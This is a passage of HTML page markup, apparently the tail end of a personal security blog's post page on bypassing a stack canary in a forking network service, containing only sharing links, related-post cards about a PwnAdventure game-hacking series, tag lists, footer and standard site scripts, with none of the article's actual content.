Blog&u=/posts/fork-leak-canary/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Bypass Canary in a Network Forking Service - EsharkyTheGreat's Personal Blog&url=/posts/fork-leak-canary/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/DefCamp-21-Blindsight/">DefCamp-21 Blindsight Writeup</a><li><a href="/posts/pwn-adventure-part3/">PwnAdventure Part3 - Memory and Structs</a><li><a href="/posts/pwn-adventure-part2/">PwnAdventure Part2 - Recon</a><li><a href="/posts/pwn-adventure-part1/">PwnAdventure Part1 - Setup</a><li><a href="/posts/First-Post/">First Test Post</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/game-hacking/">game hacking</a> <a class="post-tag" href="/tags/dlsym/">dlsym</a> <a class="post-tag" href="/tags/ld-preload/">LD_PRELOAD</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/brop/">BROP</a> <a class="post-tag" href="/tags/c/">c++</a> <a class="post-tag" href="/tags/fork/">fork</a> <a class="post-tag" href="/tags/gdb/">gdb</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/First-Post/"><div class="card-body"> <span class="timeago small" >Dec 27, 2021<i class="unloaded">2021-12-27T19:21:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>First Test Post</h3><div class="text-muted small"><p> Welcome Hello world, this is my first Jekyll blog post. I hope you like it! key: value console.log("Hello World!"); #include&lt;stdio.h&gt; int main() { int a = 5; printf("%d",a); ...</p></div></div></a></div><div class="card"> <a href="/posts/pwn-adventure-part1/"><div class="card-body"> <span class="timeago small" >Jan 19<i class="unloaded">2022-01-19T12:02:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>PwnAdventure Part1 - Setup</h3><div class="text-muted small"><p> What is this series about ? I recently came across LiverOverflow’s youtube series on PwnAdventure3. I got interested in this because it involves game hacking which I think is very cool. Please n...</p></div></div></a></div><div class="card"> <a href="/posts/pwn-adventure-part2/"><div class="card-body"> <span class="timeago small" >Jan 20<i class="unloaded">2022-01-20T12:15:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>PwnAdventure Part2 - Recon</h3><div class="text-muted small"><p> Recon What we’ll be going over in this post is external recon of the game. What I mean by external recon is just getting and overview of how the game is working without going in detail and findi...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/First-Post/" class="btn btn-outline-primary" prompt="Older"><p>First Test Post</p></a> <a href="/posts/pwn-adventure-part1/" class="btn btn-outline-primary" prompt="Newer"><p>PwnAdventure Part1 - Setup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/eshwars1210">EsharkyTheGreat</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/game-hacking/">game hacking</a> <a class="post-tag" href="/tags/dlsym/">dlsym</a> <a class="post-tag" href="/tags/ld-preload/">LD_PRELOAD</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/brop/">BROP</a> <a class="post-tag" href="/tags/c/">c++</a> <a class="post-tag" href="/tags/fork/">fork</a> <a class="post-tag" href="/tags/gdb/">gdb</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
